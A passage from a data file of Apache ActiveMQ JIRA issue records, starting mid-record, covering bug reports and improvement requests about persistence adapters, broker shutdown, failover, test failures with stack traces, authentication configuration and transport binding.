Hi all,I made the following improvements to the JDBC persistence adapter:1. Implemented PostgresqlJDBCAdapter.doDeleteOldMessages() method that is at least three orders of magnitude faster than the default implementation. The same optimization may apply to other databases so you may want to consider moving it to DefaultJDBCAdapter.2. Changed DefaultJDBCAdapter.doRecoverNextMessages() to always process at least 1000 messages at a time. This results in a huge performance improvement. However, this implementation is a hack (see comment). Somebody may want to look into why maxReturned gets set to 1 on the third call to doRecoverNextMessages(). I was able to consistently reproduce this behaviour.3. Fixed JDBCPersistenceAdapter so that it does not double-call cleanup() &#91;once in the main thread, once in the worker thread&#93;, and also so that it does not hang ActiveMQ initialization when there are lots of pending messages.Performance is now limited by repeated calls to JDBCTopicMessageStore.acknowledge(). This causes an update for every single message (updates last_acked_id in activemq_acks table). I don"t know enough about ActiveMQ architecture to optimize this, but perhaps someone should look into this. For example, if it only did this update after processing a batch of messages (say 1000 at a time), it would be a lot faster. The current implementation keeps incrementing last_acked_id, once per delivered message.Diffs attached.Eugene Here is original post on the developer forum: http://www.nabble.com/JDBC-persistence-adapter-improvements-td21086330.html#a21086330
issueID:AMQ-2064
type:Bug
changed files:
texts:memoryUsage and storeUsage of systemUsage in activemq.xml are not associated with a persistence adapter
<systemUsage>            <systemUsage>                <memoryUsage>                    <memoryUsage limit="20 mb"/>                </memoryUsage>                <storeUsage>                    <storeUsage limit="1 gb" name="foo"/>                </storeUsage>                <tempUsage>                    <tempUsage limit="100 mb"/>                </tempUsage>            </systemUsage>        </systemUsage>Memory usage works, but both the store and temp usage are not associated with a persistence adapter so they don"t take effect.The workaround is to configure a persistence adapter bean and ref it: <bean id="store" class="org.apache.activemq.store.amq.AMQPersistenceAdapter" >     <property name="directory" value="target/amqdata" />     <property name="maxFileLength" value="1000000" />     <property name="checkpointInterval" value="5000" />     <property name="cleanupInterval" value="5000" />   </bean>    <broker xmlns="http://activemq.apache.org/schema/core"     persistent="true"     advisorySupport="false"     dataDirectory="target/amqdata"     deleteAllMessagesOnStartup="true"     useJmx="true"     brokerName="localhost"     monitorConnectionSplits="false"     splitSystemUsageForProducersConsumers="false"     start="false"     persistenceAdapter="#store">       <!-- Use the following to configure how ActiveMQ is exposed in JMX -->     <managementContext>       <managementContext createConnector="false"/>     </managementContext>     <!--  The maximum about of space the broker will use before slowing down producers -->     <systemUsage>       <systemUsage sendFailIfNoSpace="true" >         <memoryUsage>           <memoryUsage limit="400kb" />         </memoryUsage>         <storeUsage>           <storeUsage limit="10mb" store="#store" />         </storeUsage>                <tempUsage>           <tempUsage limit="64mb" />         </tempUsage>       </systemUsage>     </systemUsage>from: http://open-source-adventures.blogspot.com/2009/01/limiting-disk-store-usage-with-active.html It should  be possible to ensure that a store or temp usage not associated with a store is associated with the broker persistence adapter in XBrokerService afterPropertiesSet.
issueID:AMQ-2068
type:Bug
changed files:
texts:Wrong/missing OSGi metadata in activemq-core and kahadb
In order to be able to use ActiveMQ 5.3-SNAPSHOT inside an OSGi container (e.g. ServiceMix Kernel), two modifications are required: the org.apache.maven.* packages should be marked as optional imports from activemq-core kahadb needs to be packaged as an OSGi bundle
issueID:AMQ-2069
type:Bug
changed files:ActiveMQEndpointWorker.java
texts:Thread deadlock in ActiveMQEndpointWorker class
It will happen when one thread is in a loop to try to connect the broker, in the meanwhile another thread calls the stop action.Thread A (in the run() method) holds the connectWork, and requires the shutdownMutex when it is notified by the notifyAll action by ThreadB.Thread B (in the stop() method) holds the shutdownMutex, and requires the connectWork in the disconnect method.I move the disconnect() invocation out of the synchronized (shutdownMutex) block, it works well.Thanks !
issueID:AMQ-2070
type:Bug
changed files:BrokerService.java
texts:activemq process does not exit after stop() and other stop related issue
There are a few issues to stop activemq1. using jconsole and call broker.stop(), the java process of activemq will not quit, the root cause is when jetty is configured using xbean in activemq.xml, the broker.stop() does not stop jetty server so the java process will not quit, however the web admin will not work after broker.stop() and will display jsp exceptions.2. the current activemq-console code which activemq-admin is using to do stop broker is calling terminateJVM and does not handle exceptions thrown3. we have a use case when we stop a broker, we don"t want any pending messages stuck in the broker, because it requires us to restart the broker immediately to not to lose those pending messages.It will be a problem if in real world we cannot restart it right away and those pending messages are critical. The solution we thought is as follows:What we want is to use the current network of brokers forwarding mechanism to forward those pending messages to other broker which has a related consumer, then stop the broker completely and we don"t need to restart the stopped broker right away. for example, we have a network of two brokers, A, and B, the client(producer/consumer) is using failover://(tcp:brokerA:port1, tcp:brokerB:port1), then when we want to stop A and it has 10 pending messages, we want stop A"s transport that the client is connecting to, so client will failover to broker B, then 10 pending messages will be forwarded to broker B, then we can stop the broker A completely.To address the above issues, attached are two patches, one for activemq-core and one for activemq-console, both patches are based on tags/activemq-5.2.0 please review them and I will appreciate if it can be applied to trunk. If you have any question regarding these changes, please let me know. Thank you.With the patches:Here is a sample usage:./activemq-admin stopGracefully --connectorName ssl --queueName test*? --timeout 120 --pollInterval 20 --jmxurl service:jmx:rmi:///jndi/rmi://localhost:3616/jmxrmithis command will stop connector ssl, and it will check queues starting with test (queueName takes regex) to make sure they have no pending messages then stop the broker. It will check the queuesize every 20 seconds and timeout in 120 seconds. If after timeout, there are still pending messages in the queues, it will not stop the broker and it will need manual check to stop the broker properly.ADDED: 1. the patches fix more issues for stopping the broker. if broker starts as master and waitForslave, stop will not let the java quit the process. Also if slave is started first and use failover to talk to the master, you can also stop it before it establish the connection with the master.2. added to use localProcessId to get jmxurl, that way, activemq-admin can access jmx as a local jconsole, without jmxuser and jmxpassword, while remote jconsole still needs authentication when it is turned on. for this you need -Dcom.sun.management.jmxremote when starting activemqThere is a known issue of jmx rmi is two ports, one can be configured and the other is using random ports when a remote jconsole connects. this is not acceptable in a firewall environment. If concerned, please check my other post http://www.nabble.com/JMX-remote-managmentContext-and-firewall-to21969017.html you can use a custom agent to be able to configure two fixed ports.
issueID:AMQ-2071
type:Improvement
changed files:BrokerView.java
BrokerService.java
BrokerViewMBean.java
TransportConnection.java
MasterConnector.java
texts:masterConnectorURI using failover
We have a use case of configuring two pair of master/slave as follows:A-master/A-slaveB-master/B-slaveand for client(producer/consumer) we use failover://(tcp://A-master, tcp://B-master) so A-slave and B-slave only is used to replicate the data their master receives. In this case, we want to use failover://(tcp://A-master) as masterConnectorURI for A-slave, similar to B. so that when A-master goes down and gets restarted, A-slave will be able to reconnect so we don"t need to do anything with A-slave when A-master is down and up.Attached patch is based on tags/activemq-5.2.0 intended to address this, please review it and I will appreciate it can be applied to the trunk ( tags and trunk has the same previous file). Please let me know if you have any question regarding this. Thank youpatches are at https://issues.apache.org/activemq/browse/AMQ-2070AMQ-2070 and AMQ-2071 are related because if you cannot use failover as uri in masterConnectorURI and you start the slave before master, you will have issue. failover takes care of that.
issueID:AMQ-2074
type:Bug
changed files:pom.xml
JPAPersistenceAdapter.java
BrokerService.java
texts:Intermittent test failure - QuickJPAStoreRecoveryBrokerTest
running through maven &#8211; failed two times, then succeeded.Running in IDEA &#8211; hung once, then all tests passed.surefire report:  <testcase time="0.349" name="testQueueNonPersistentMessagesLostOnRestart">    <error type="&openjpa-1.0.0-r420667" message="The context has been closed.  The stack trace at which the context was closed is available if Runtime=TRACE logging is enabled.">&openjpa-1.0.0-r420667:568756 fatal user error& org.apache.openjpa.persistence.InvalidStateException: The context has been closed.  The stack trace at which the context was closed is available if Runtime=TRACE logging is enabled.        at org.apache.openjpa.kernel.BrokerImpl.assertOpen(BrokerImpl.java:4291)        at org.apache.openjpa.kernel.BrokerImpl.beginOperation(BrokerImpl.java:1702)        at org.apache.openjpa.kernel.BrokerImpl.getUserObject(BrokerImpl.java:563)        at org.apache.openjpa.persistence.JPAFacadeHelper.toEntityManager(JPAFacadeHelper.java:113)        at org.apache.openjpa.persistence.PersistenceExceptions.getFailedObject(PersistenceExceptions.java:246)        at org.apache.openjpa.persistence.PersistenceExceptions.translateUserException(PersistenceExceptions.java:190)        at org.apache.openjpa.persistence.PersistenceExceptions.translateException(PersistenceExceptions.java:131)        at org.apache.openjpa.persistence.PersistenceExceptions.getNestedThrowables(PersistenceExceptions.java:233)        at org.apache.openjpa.persistence.PersistenceExceptions.translateUserException(PersistenceExceptions.java:190)        at org.apache.openjpa.persistence.PersistenceExceptions.translateException(PersistenceExceptions.java:131)        at org.apache.openjpa.persistence.PersistenceExceptions.toPersistenceException(PersistenceExceptions.java:83)        at org.apache.openjpa.persistence.PersistenceExceptions$1.translate(PersistenceExceptions.java:43)        at org.apache.openjpa.kernel.DelegatingBrokerFactory.translate(DelegatingBrokerFactory.java:96)        at org.apache.openjpa.kernel.DelegatingBrokerFactory.close(DelegatingBrokerFactory.java:185)        at org.apache.openjpa.persistence.EntityManagerFactoryImpl.close(EntityManagerFactoryImpl.java:286)        at org.apache.activemq.store.jpa.JPAPersistenceAdapter.stop(JPAPersistenceAdapter.java:214)        at org.apache.activemq.store.amq.AMQPersistenceAdapter.stop(AMQPersistenceAdapter.java:327)        at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)        at org.apache.activemq.broker.BrokerService.stop(BrokerService.java:512)        at org.apache.activemq.broker.BrokerTestSupport.tearDown(BrokerTestSupport.java:101)        at junit.framework.TestCase.runBare(TestCase.java:130)        at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:90)        at junit.framework.TestResult$1.protect(TestResult.java:106)        at junit.framework.TestResult.runProtected(TestResult.java:124)        at junit.framework.TestResult.run(TestResult.java:109)        at junit.framework.TestCase.run(TestCase.java:118)        at junit.framework.TestSuite.runTest(TestSuite.java:208)        at junit.framework.TestSuite.run(TestSuite.java:203)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:585)        at org.apache.maven.surefire.junit.JUnitTestSet.execute(JUnitTestSet.java:210)        at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.executeTestSet(AbstractDirectoryTestSuite.java:135)        at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.execute(AbstractDirectoryTestSuite.java:122)        at org.apache.maven.surefire.Surefire.run(Surefire.java:129)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:585)        at org.apache.maven.surefire.booter.SurefireBooter.runSuitesInProcess(SurefireBooter.java:225)        at org.apache.maven.surefire.booter.SurefireBooter.main(SurefireBooter.java:747)</error>    <system-err>1  activemq  INFO   &#91;main&#93; openjpa.Runtime - Starting OpenJPA 1.0.01  activemq  INFO   &#91;main&#93; openjpa.jdbc.JDBC - Using dictionary class "org.apache.openjpa.jdbc.sql.DerbyDictionary".52  activemq  INFO   &#91;main&#93; openjpa.Enhance - Creating subclass and redefining methods for "&#91;class org.apache.activemq.store.jpa.model.StoredMessage, class org.apache.activemq.store.jpa.model.StoredMessageReference&#93;". This means that your application will be less efficient than it would if you ran the OpenJPA enhancer.0  activemq  INFO   &#91;main&#93; openjpa.Runtime - Starting OpenJPA 1.0.00  activemq  INFO   &#91;main&#93; openjpa.jdbc.JDBC - Using dictionary class "org.apache.openjpa.jdbc.sql.DerbyDictionary".55  activemq  INFO   &#91;main&#93; openjpa.Enhance - Creating subclass and redefining methods for "&#91;class org.apache.activemq.store.jpa.model.StoredMessage, class org.apache.activemq.store.jpa.model.StoredMessageReference&#93;". This means that your application will be less efficient than it would if you ran the OpenJPA enhancer.</system-err>  </testcase>2nd report:  <testcase time="0.398" name="testQueueNonPersistentMessagesLostOnRestart">    <error type="&openjpa-1.0.0-r420667" message="This operation failed for some instances.  See the nested exceptions array for details.">&openjpa-1.0.0-r420667:568756 nonfatal user error& org.apache.openjpa.persistence.InvalidStateException: This operation failed for some instances.  See the nested exceptions array for details.        at org.apache.openjpa.kernel.AbstractBrokerFactory.assertNoActiveTransaction(AbstractBrokerFactory.java:696)        at org.apache.openjpa.kernel.AbstractBrokerFactory.close(AbstractBrokerFactory.java:373)        at org.apache.openjpa.kernel.DelegatingBrokerFactory.close(DelegatingBrokerFactory.java:183)        at org.apache.openjpa.persistence.EntityManagerFactoryImpl.close(EntityManagerFactoryImpl.java:286)        at org.apache.activemq.store.jpa.JPAPersistenceAdapter.stop(JPAPersistenceAdapter.java:214)        at org.apache.activemq.store.amq.AMQPersistenceAdapter.stop(AMQPersistenceAdapter.java:327)        at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)        at org.apache.activemq.broker.BrokerService.stop(BrokerService.java:512)        at org.apache.activemq.broker.BrokerTestSupport.tearDown(BrokerTestSupport.java:101)        at junit.framework.TestCase.runBare(TestCase.java:130)        at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:90)        at junit.framework.TestResult$1.protect(TestResult.java:106)        at junit.framework.TestResult.runProtected(TestResult.java:124)        at junit.framework.TestResult.run(TestResult.java:109)        at junit.framework.TestCase.run(TestCase.java:118)        at junit.framework.TestSuite.runTest(TestSuite.java:208)        at junit.framework.TestSuite.run(TestSuite.java:203)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:585)        at org.apache.maven.surefire.junit.JUnitTestSet.execute(JUnitTestSet.java:210)        at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.executeTestSet(AbstractDirectoryTestSuite.java:135)        at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.execute(AbstractDirectoryTestSuite.java:122)        at org.apache.maven.surefire.Surefire.run(Surefire.java:129)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:585)        at org.apache.maven.surefire.booter.SurefireBooter.runSuitesInProcess(SurefireBooter.java:225)        at org.apache.maven.surefire.booter.SurefireBooter.main(SurefireBooter.java:747)Caused by: &openjpa-1.0.0-r420667:568756 nonfatal user error& org.apache.openjpa.persistence.InvalidStateException: This operation cannot be performed while a Transaction is active.FailedObject: org.apache.openjpa.persistence.EntityManagerImpl@631cb0        at org.apache.openjpa.kernel.AbstractBrokerFactory.assertNoActiveTransaction(AbstractBrokerFactory.java:690)        ... 30 more</error>    <system-err>1  activemq  INFO   &#91;main&#93; openjpa.Runtime - Starting OpenJPA 1.0.04  activemq  INFO   &#91;main&#93; openjpa.jdbc.JDBC - Using dictionary class "org.apache.openjpa.jdbc.sql.DerbyDictionary".1  activemq  INFO   &#91;main&#93; openjpa.Runtime - Starting OpenJPA 1.0.01  activemq  INFO   &#91;main&#93; openjpa.jdbc.JDBC - Using dictionary class "org.apache.openjpa.jdbc.sql.DerbyDictionary".</system-err>  </testcase>
issueID:AMQ-2075
type:Bug
changed files:
texts:Intermittent test failure - BrokerTest
Only info I have is from surefire report:  <testcase time="4.017" name="testQueueBrowserWith2Consumers {deliveryMode=2}">    <failure type="junit.framework.AssertionFailedError" message="m1 is null for index: 0">junit.framework.AssertionFailedError: m1 is null for index: 0        at junit.framework.Assert.fail(Assert.java:47)        at junit.framework.Assert.assertTrue(Assert.java:20)        at junit.framework.Assert.assertNotNull(Assert.java:220)        at org.apache.activemq.broker.BrokerTest.testQueueBrowserWith2Consumers(BrokerTest.java:148)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:585)        at junit.framework.TestCase.runTest(TestCase.java:154)        at junit.framework.TestCase.runBare(TestCase.java:127)        at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:90)        at junit.framework.TestResult$1.protect(TestResult.java:106)        at junit.framework.TestResult.runProtected(TestResult.java:124)        at junit.framework.TestResult.run(TestResult.java:109)        at junit.framework.TestCase.run(TestCase.java:118)        at junit.framework.TestSuite.runTest(TestSuite.java:208)        at junit.framework.TestSuite.run(TestSuite.java:203)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:585)        at org.apache.maven.surefire.junit.JUnitTestSet.execute(JUnitTestSet.java:210)        at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.executeTestSet(AbstractDirectoryTestSuite.java:135)        at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.execute(AbstractDirectoryTestSuite.java:160)        at org.apache.maven.surefire.Surefire.run(Surefire.java:81)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:585)        at org.apache.maven.surefire.booter.SurefireBooter.runSuitesInProcess(SurefireBooter.java:182)        at org.apache.maven.surefire.booter.SurefireBooter.main(SurefireBooter.java:743)</failure>  </testcase>
issueID:AMQ-2076
type:Bug
changed files:
texts:Intermittent test failure - DataFileNotDeletedTest
Only info is surefire report  <testcase time="34.105" name="testForDataFileNotDeletedTransacted">    <failure type="junit.framework.AssertionFailedError" message="persistence adapter dataManager has correct number of files expected:&lt;2&gt; but was:&lt;22&gt;">junit.framework.AssertionFailedError: persistence adapter dataManager has correct number of files expected:&2& but was:&22&        at junit.framework.Assert.fail(Assert.java:47)        at junit.framework.Assert.failNotEquals(Assert.java:282)        at junit.framework.Assert.assertEquals(Assert.java:64)        at junit.framework.Assert.assertEquals(Assert.java:201)        at org.apache.activemq.bugs.DataFileNotDeletedTest.waitFordataFilesToBeCleanedUp(DataFileNotDeletedTest.java:110)        at org.apache.activemq.bugs.DataFileNotDeletedTest.doTestForDataFileNotDeleted(DataFileNotDeletedTest.java:97)        at org.apache.activemq.bugs.DataFileNotDeletedTest.testForDataFileNotDeletedTransacted(DataFileNotDeletedTest.java:78)</failure>  </testcase>
issueID:AMQ-2078
type:Bug
changed files:
texts:Intermittent test failure -- like JmsTransactionTestSupport.testReceiveRollback
I"m seeing intermittent test failures in the tck in a test similar to JmsTransactionTestSupport.testReceiveRollback, except done with xa UserTransactions and through the ra.  Running the test individually always passes but running it in a group usually falis.I"ve extended the JmsTransactionTestSupport to work with xa tx using the ra but this test always passes for me.
issueID:AMQ-2079
type:Bug
changed files:ActiveMQSession.java
ManagedConnectionProxy.java
ActiveMQConnection.java
texts:conflict between checking validity of createSession args and requirement to ignore them in managed environment
Since amq 4 someone added some parameter checking to ActiveMQConnection.createSession.  This seems like a good idea until you get to the connector and read the ejb spec where it says in a managed environment these parameters should be ignored.  I"m not sure how much they really can be ignored if an xa tx is not present.  What I"ve done is to enhance the checking in ActiveMQConnection.createSession to be more thorough with better messages and to modify the ra ManagedConnectionProxy to modify one of the parameters if they are inconsistent (i.e. transacted == false, but ack mode == SESSION_TRANSACTED)  (I change it to AUTO_ACKNOWLDEDGE).  I haven"t found this causing any problems.
issueID:AMQ-2080
type:Bug
changed files:
texts:InitialReconnectDelay appears to be ignored in Discovery transport URLs
Using a connection URL ofdiscovery:(multicast://default?group=test)?maxReconnectAttempts=13&initialReconnectDelay=1000&useExponentialBackOff=falseone would expect initial connection attempts to go on for at least 13 seconds (13 reconnect attempts with 1000ms delay between attempts) but in fact the error "No uris available to connect to" returned in less than a second.  Changing  useExponentialBackOff to true delays a failure report to about 41 seconds, which is 10ms * 2^12, which is what you"d expect with 12 reconnect attempts (13 connect attempts) starting with the default 10ms delay and doubling with every attempt, since 2^0+2^1+2^2+...2^n-1 is approx 2^n.  (I guess maxReconnectAttempts should be called maxConnectAttempts, but I"m not opening a bug about that.)  Changing maxReconnectAttempts to 12 causes the delay to be about 20 seconds, half of what it is for 13, so that checks out.Altogether this points to the initialReconnectDelay parameter being ignored on initial connection attempts.   It is supposed to work per  http://activemq.apache.org/discovery-transport-reference.html
issueID:AMQ-2081
type:Improvement
changed files:
texts:Allow SimpleAuthenticationBroker to assign privileges to &#39;anonymous&#39; users.
When using the SimpleAuthenticationBroker, there is currently no way to have a combination of "anonymous" and "privileged" users. For example, setting up an externally accesible queue or topic, it is often desirable to allow external users access without having to specify a username/password, i.e. read-only. It is similarly desirable to allow internal users access on a read/write basis by specifying a username/password.It should be possible to instruct the SimpleAuthenticationBroker that users without a username/password should be put into a specific group for "anonymous" users, and hence have privileges assigned to them, whilst also allowing privileges to be assigned to users that provide authentication details.
issueID:AMQ-2082
type:Bug
changed files:
texts:Message Groups fail to preserve exclusivity when a new consumer is added.
If a new consumer is added to a running system, the exclusive property of a message group can be temporarily violated.Uploading a new unit test. An excerpt of the test results is below, which shows that the message groups GrA and GrB are being handled by both consumers simultaneously.15:11:58,498 INFO GroupNewConsumerTest - Con2 got message GrA-515:11:58,560 INFO GroupNewConsumerTest - Con2 got message GrB-515:11:58,560 INFO GroupNewConsumerTest - Con1 got message GrB-315:11:58,623 INFO GroupNewConsumerTest - Con1 got message GrA-415:11:58,623 INFO GroupNewConsumerTest - Con2 got message GrA-615:11:58,685 INFO GroupNewConsumerTest - Con1 got message GrB-415:11:58,685 INFO GroupNewConsumerTest - Con2 got message GrB-615:11:58,748 INFO GroupNewConsumerTest - Con1 got message GrB-715:11:58,748 INFO GroupNewConsumerTest - Con2 got message GrA-715:11:58,810 INFO GroupNewConsumerTest - Con1 got message GrB-815:11:58,810 INFO GroupNewConsumerTest - Con2 got message GrA-815:11:58,873 INFO GroupNewConsumerTest - Con2 got message GrA-915:11:58,935 INFO GroupNewConsumerTest - Con2 got message GrB-9This may be the same issue described in:http://www.nabble.com/Message-groups-not-working-when-consuming-existing-messages-td18445237.html#a18445237Note that setting the prefetch to 1 made reproducing the issue much easier. (See the unit test)keywords: JMSXGroup JMSXGroupID JMSXGroupSeq
issueID:AMQ-2084
type:Bug
changed files:
texts:ActiveMQ - XPATH Selectors - Unable to make it work
I am using ActiveMQ 5.2.  I am unable to make use of XPATH selectors. Sample XML message: <?xml version="1.0" encoding="UTF-8"?><books><book lang="en">ABC</book></books>Topic where message is posted: VirtualTopic.TestXpathQueue where message is listened to: Consumer.Sample.VirtualTopic.TestXpathXPATH selector specified: XPATH "//books//book&#91;@lang=&#39;&#39;en&#39;&#39;&#93;"Protocol: OpenWireI read a different post on the same topic and added the following necessary JAR files to the classpath apart from activemq-all-5.2.0.jar:  xalan.jar xercesImpl.jar xml-apis.jar I have tried a lot of different combination for the XPATH selector but still the consumer is not getting any messages. I am consuming from the physical queue of the virtual topic to which I am publishing. I receive all the messages from the same physical queue if I don"t use any selectors.Please find attached the test class (TestXPathSelectors.java) for reference. ActiveMQ - User Forum Thread Link: http://www.nabble.com/ActiveMQ---XPATH-Selectors---Unable-to-make-it-work-to21610375.html
issueID:AMQ-2085
type:Bug
changed files:ManagementContext.java
texts:AMQ should not install a JMXConnectorServer for an MBeanServer it does not create
ManagementContext tends to create a JMXConnectorServer whenever findMBeanServer is called.  This seems like really wrong behavior &#8211; amq should not be setting up jmx remoting on mbean servers it hasn"t created, certainly not as a side effect of something like creating a vm transport connection:   createConnector():365, ManagementContext.java   findMBeanServer():293, ManagementContext.java   getMBeanServer():148, ManagementContext.java   start():77, ManagementContext.java   start():458, BrokerService.java   doCompositeConnect():123, VMTransportFactory.java   doConnect():53, VMTransportFactory.java   doConnect():51, TransportFactory.java   connect():80, TransportFactory.java   createTransport():239, ActiveMQConnectionFactory.java   createActiveMQConnection():254, ActiveMQConnectionFactory.java   createConnection():181, ActiveMQConnectionFactory.java   makeConnection():79, ActiveMQConnectionSupport.java   makeConnection():61, ActiveMQConnectionSupport.java   createManagedConnection():169, ActiveMQManagedConnectionFactory.java
issueID:AMQ-2086
type:Bug
changed files:
texts:Duplex network connector policies are not honrred while consuming
To reproduce the problem:1. define a duplex network with some destination policies2. send a message to the excluded destination on the remote broker3. try consume the message locally4. the message should not be consumed (but it is)
issueID:AMQ-2087
type:Bug
changed files:
texts:Redelivery after rollback does not seem to work well
None
issueID:AMQ-2088
type:Improvement
changed files:UdpTransportFactory.java
StompWireFormat.java
SslTransportFactory.java
InactivityMonitor.java
ObjectStreamWireFormat.java
WireFormat.java
TcpTransportFactory.java
UdpTransportServer.java
OpenWireFormat.java
texts:Change the InactivityMonitor to clear its flag as soon as a few bytes are received on a connection rather than only after an entire message has been assembled.
On slow connections with larger messages to be exchanged, the inactivity monitor might kick in, drop the network connection and re-establish it again. This prevents two brokers from exchanging larger messages on a slow connection as the transmission always gets interrupted.See the discussion of this on http://activemq.apache.org/slow-networks-drop-large-messages.html. The problem is that the InactivityMonitor always waits for a complete message to be assembled on an active connection before clearing its internal flag.I propose to change the behavior of the InactivityMonitor so that it clears its flag already when a few bytes were received on a network connection rather than waiting for the entire message to be sent. This should work around the problem of connections being dropped and re-established periodically when receiving large messages.
issueID:AMQ-2091
type:Improvement
changed files:
texts:Add a cache to the jms selector parser for speed improvements
When using the same complex selectors multiple times, having a cache would improve performances greatly on both client and server sides.
issueID:AMQ-2092
type:Improvement
changed files:TransportConnection.java
texts:Throw an error freindly message incase of corrupted connection creation command
Instead of class cast exception likeCould not accept connection : java.lang.Object cannot be cast to org.apache.activemq.command.Commandthrow more user friendly exceptionCould not accept connection : Protocol violation - Command corrupted
issueID:AMQ-2094
type:Bug
changed files:TcpTransportServer.java
texts:Can&#39;t bind the connector to localhost or actuall IP correctly.
ActiveMQ server socket created with TcpTransportServer  can"t bind to localhost or actuall IP correctly.   expected result:   localhost  ---> bind to 127.0.0.1  actual IP  ----> bind to  actual IP   actual result:   localhost  ---> bind to 0.0.0.0  actual IP  ----> bind to 0.0.0.0  "org.apache.activemq.transport.tcp.TcpTransportServer"        InetAddress addr = InetAddress.getByName(host);       try {           if (host.trim().equals("localhost") || addr.equals(InetAddress.getLocalHost())) {  //#1 start the socket with 0.0.0.0            this.serverSocket = serverSocketFactory.createServerSocket(bind.getPort(), backlog);  }           else {            //#2  start the socket with the ip spcified in addr.            this.serverSocket = serverSocketFactory.createServerSocket(bind.getPort(), backlog, addr);  }Since if you config the real IP as a host setting, addr.equals(InetAddress.getLocalHost()) will allways be true so that the #1 will be used to start the socket with 0.0.0.0 by default.  Which causes a defect of geronimo: https://issues.apache.org/jira/browse/GERONIMO-4404
issueID:AMQ-2095
type:Improvement
changed files:SessionPool.java
JcaConnectionPool.java
XaConnectionPool.java
PooledSession.java
texts:Make pooled session implement XASession in case we need very specific management
None
issueID:AMQ-2096
type:Bug
changed files:AdvisoryBroker.java
texts:WARN AdvisoryBroker - Failed to fire message master broker advisory
Starting up activemq with a default configuration + simple authentication + mysql-ds like:        <plugins>            <simpleAuthenticationPlugin>              <users>                <authenticationUser username="${activemq.username}" password="${activemq.password}"                  groups="producers,consumers,admins"/>              </users>            </simpleAuthenticationPlugin>            <authorizationPlugin>               <map>                 <authorizationMap>                   <authorizationEntries>                     <authorizationEntry queue=">" write="producers" read="consumers" admin="admins" />                     <authorizationEntry topic=">" write="producers" read="consumers" admin="admins" />                     <authorizationEntry queue="ActiveMQ.Advisory.>" write="all" read="all" admin="all" />                     <authorizationEntry topic="ActiveMQ.Advisory.>" write="all" read="all" admin="all" />                   </authorizationEntries>                 </authorizationMap>               </map>            </authorizationPlugin>                    </plugins>         and a default mysql-ds as jdbcPersistenceAdapter results in the following warning message:         WARN AdvisoryBroker - Failed to fire message master broker advisorythere seems to be no problems in the further processing of advisory messages, but the warning is introduced with the use of the authentication plugin.greets,jochen
issueID:AMQ-2097
type:Bug
changed files:
texts:missing jar dependency for activemq-xmpp
there is one missing jar dependency which will prevent users of activemq following the documentation (http://activemq.apache.org/xmpp.html) from connecting successfully.the bigger problem is that the connector itself does not complain about any missing jar but behaves like in a real connection process (debugging with psi leaves you in a state of "wtf").the missing jar is the wstx-asl-3.0.1.jar (see pom.xml dependencies in the activemq-xmpp).this should at least be mentioned immediately in the documentation cause the feature itself (xmpp in conjunction with the agent topic) is awesome.greets,jochen
issueID:AMQ-2098
type:Bug
changed files:LegacyFrameTranslator.java
JmsFrameTranslator.java
ProtocolConverter.java
texts:Advisory messages are empty when received with a Stomp subscription
We need advisory messages for client connections, and we are stomp when connecting to ActiveMQ.  When we subscribe to ActiveMQ.Advisory.Connection, we get messages when clients connect of disconnect, but the messages are empty.  I suspect the information is lost when converting the ActiveMQMessage to a Stomp message.Some sort of simple serialization (like key: value pairs) of the ConnectionInfo object in ActiveMQMessage.getDataStructure would solve the problem.
issueID:AMQ-2100
type:Bug
changed files:
texts:Concurrent Modification of Delivered Messages in MessageConsumer.dispose()
See thread on ActiveMQ user list: http://www.nabble.com/ConcurrentModificationException-while-closing-consumer-td21867250.html#a21924323
issueID:AMQ-2101
type:Improvement
changed files:
texts:Upgrade dbcp
Assembly does not respect dbcp version and includes 1.2 (instead of 1.2.2) in the distribution.
issueID:AMQ-2102
type:Bug
changed files:
texts:Master/slave out of sync with multiple consumers
